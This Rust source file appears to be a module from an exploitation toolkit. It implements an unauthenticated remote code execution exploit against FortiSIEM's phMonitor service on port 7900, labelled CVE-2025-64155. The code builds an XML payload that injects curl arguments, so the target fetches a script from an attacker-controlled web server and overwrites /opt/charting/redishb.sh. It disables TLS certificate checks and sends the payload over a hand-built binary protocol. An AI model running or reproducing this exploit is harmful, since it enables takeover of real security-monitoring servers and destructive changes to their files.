use anyhow::{Result, Context};
use colored::*;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_rustls::rustls::{ClientConfig, RootCertStore, pki_types::ServerName};
use tokio_rustls::TlsConnector;
use std::sync::Arc;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default, prompt_port};

/// FortiSIEM Unauthenticated RCE (CVE-2025-64155)
/// 
/// 1:1 Port from Horizon3.ai PoC
/// Target: FortiSIEM phMonitor service (port 7900)
/// Logic: Argument injection via XML payload in custom binary protocol over SSL.
/// Payload: Overwrites /opt/charting/redishb.sh via curl -o injection.

pub async fn run(target: &str) -> Result<()> {
    print_banner();

    // Determine target
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // PoC uses port 7900 default
    let port = 7900;
    println!("{} Target: {}:{}", "[*]".blue(), target_ip, port);
    
    // Warning about destructiveness
    println!("{}", "WARNING: This exploit is DESTRUCTIVE.".red().bold());
    println!("{}", "It overwrites /opt/charting/redishb.sh on the target.".red());
    println!("{}", "It executes a command via curl argument injection.".red());
    
    let lhost = prompt_default("LHOST (Your IP) for payload download", "127.0.0.1")?;
    let lport = prompt_port("LPORT (Your Web Server Port)", 8000)?;
    let filename = "redishb.sh"; 
    
    println!("{} Ensure you are hosting a malicious '{}' at http://{}:{}/{}", "[*]".yellow(), filename, lhost, lport, filename);
    println!("{} The exploit will force the target to download this file and overwrite /opt/charting/redishb.sh", "[*]".yellow());
    
    let payload_url = format!("http://{}:{}/{}", lhost, lport, filename);
    let injection = format!("http://{}:{} --next -o /opt/charting/redishb.sh {}", lhost, lport, payload_url);
    
    // Construct payload per PoC
    let xml_payload = format!(
r#"<TEST_STORAGE type="elastic">
    <client_type>javaTransportClient</client_type>
    <cluster_name>test_name</cluster_name>
    <cluster_ip>127.0.0.1</cluster_ip>
    <cluster_url>{}</cluster_url>
    <java_port>5555</java_port>
    <http_port>4444</http_port>
    <number_of_shards>3</number_of_shards>
    <number_of_replicas>4</number_of_replicas>
    <elasticsearch_service_type>test_type</elasticsearch_service_type>
    <username>testuser</username>
    <password>testpass</password>
</TEST_STORAGE>"#, injection);

    // TLS Setup
    let root_store = RootCertStore::empty();
    let mut config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();
    
    // Allow invalid certs (dangerous but necessary for exploits)
    #[derive(Debug)]
    struct NoVerify;
    impl tokio_rustls::rustls::client::danger::ServerCertVerifier for NoVerify {
        fn verify_server_cert(
            &self,
            _end_entity: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
            _intermediates: &[tokio_rustls::rustls::pki_types::CertificateDer<'_>],
            _server_name: &ServerName<'_>,
            _ocsp_response: &[u8],
            _now: tokio_rustls::rustls::pki_types::UnixTime,
        ) -> Result<tokio_rustls::rustls::client::danger::ServerCertVerified, tokio_rustls::rustls::Error> {
            Ok(tokio_rustls::rustls::client::danger::ServerCertVerified::assertion())
        }
        
        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
            _dss: &tokio_rustls::rustls::DigitallySignedStruct,
        ) -> Result<tokio_rustls::rustls::client::danger::HandshakeSignatureValid, tokio_rustls::rustls::Error> {
            Ok(tokio_rustls::rustls::client::danger::HandshakeSignatureValid::assertion())
        }
        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
            _dss: &tokio_rustls::rustls::DigitallySignedStruct,
        ) -> Result<tokio_rustls::rustls::client::danger::HandshakeSignatureValid, tokio_rustls::rustls::Error> {
             Ok(tokio_rustls::rustls::client::danger::HandshakeSignatureValid::assertion())
        }
        fn supported_verify_schemes(&self) -> Vec<tokio_rustls::rustls::SignatureScheme> {
            vec![
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA1,
                tokio_rustls::rustls::SignatureScheme::ECDSA_SHA1_Legacy,
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA256,
                tokio_rustls::rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA384,
                tokio_rustls::rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA512,
                tokio_rustls::rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
                tokio_rustls::rustls::SignatureScheme::RSA_PSS_SHA256,
                tokio_rustls::rustls::SignatureScheme::RSA_PSS_SHA384,
                tokio_rustls::rustls::SignatureScheme::RSA_PSS_SHA512,
                tokio_rustls::rustls::SignatureScheme::ED25519,
                tokio_rustls::rustls::SignatureScheme::ED448,
            ]
        }
    }
    config.dangerous().set_certificate_verifier(Arc::new(NoVerify));
    
    let connector = TlsConnector::from(Arc::new(config));
    let addr = format!("{}:{}", target_ip, port);
    
    println!("{} Connecting to {}...", "[*]".blue(), addr);
    let stream = TcpStream::connect(&addr).await.context("Failed to connect to target")?;
    
    // TLS Handshake
    let domain = ServerName::try_from(target_ip.as_str())
        .map(|n| n.to_owned())
        .or_else(|_| ServerName::try_from("example.com").map(|n| n.to_owned()))
        .context("Failed to create ServerName")?;

    let mut tls_stream = connector.connect(domain, stream).await.context("TLS handshake failed")?;

    // Construct Packet manually using to_le_bytes
    // Header: 156 (u32), len (u32), 1075724911 (u32), 0 (u32)
    // Payload: xml string
    
    let payload_bytes = xml_payload.as_bytes();
    let payload_len = payload_bytes.len() as u32;
    
    let mut packet = Vec::new();
    packet.extend_from_slice(&156u32.to_le_bytes()); // Packet type?
    packet.extend_from_slice(&payload_len.to_le_bytes()); // Payload length
    packet.extend_from_slice(&1075724911u32.to_le_bytes()); // Magic?
    packet.extend_from_slice(&0u32.to_le_bytes()); // Padding?
    packet.extend_from_slice(payload_bytes);
    
    println!("{} Sending payload ({} bytes)...", "[*]".blue(), packet.len());
    println!("{} Payload:\n{}", "[*]".blue(), xml_payload);

    tls_stream.write_all(&packet).await.context("Failed to send payload")?;
    
    // Read response
    let mut buf = vec![0u8; 1024];
    // Set timeout for read
    let read_result = tokio::time::timeout(Duration::from_secs(5), tls_stream.read(&mut buf)).await;
    
    match read_result {
        Ok(Ok(n)) => {
            if n > 0 {
                // PoC output: "Recevied: b'\x00\x00\x00\x00'" or similar?
                println!("{} Response received: {:?}", "[+]".green(), &buf[..n]);
                println!("{} Exploit sent successfully.", "[+]".green());
            } else {
                println!("{} Connection closed or empty response.", "[*]".yellow());
            }
        },
        Ok(Err(e)) => println!("{} Error reading response: {}", "[-]".red(), e),
        Err(_) => println!("{} Read timed out (expected if no response).", "[*]".yellow()),
    }

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      FortiSIEM RCE (CVE-2025-64155)                       ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
